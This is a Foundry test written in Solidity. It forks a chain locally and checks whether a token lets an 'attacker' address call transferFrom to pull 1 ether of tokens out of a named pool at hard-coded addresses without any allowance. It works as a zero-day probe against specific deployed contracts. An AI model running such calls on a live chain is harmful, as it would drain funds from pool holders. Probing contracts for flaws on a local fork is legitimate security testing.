// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;

import {Test, console2} from "forge-std/Test.sol";

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ZeroDayTest is Test {
    address constant OWL = 0x51E667E91b4B8Cb8e6E0528757F248406bD34B57;
    address constant POOL = 0x631a7855F261c261Db252a3A398E8990AE569199; 
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8545");
    }

    function test_TransferFromExploit() public {
        console2.log("--- Zero-Day Probe: Unprotected TransferFrom ---");
        
        uint256 poolBalance = IERC20(OWL).balanceOf(POOL);
        console2.log("Pool Balance:", poolBalance);
        
        if (poolBalance == 0) {
            console2.log("Skipping: Pool is empty or wrong address.");
            return;
        }

        vm.startPrank(attacker);
        
        try IERC20(OWL).transferFrom(POOL, attacker, 1 ether) {
            console2.log("VULNERABILITY CONFIRMED: transferFrom success without allowance!");
        } catch {
            console2.log("SECURE: transferFrom requires allowance.");
        }
        
        vm.stopPrank();
    }
}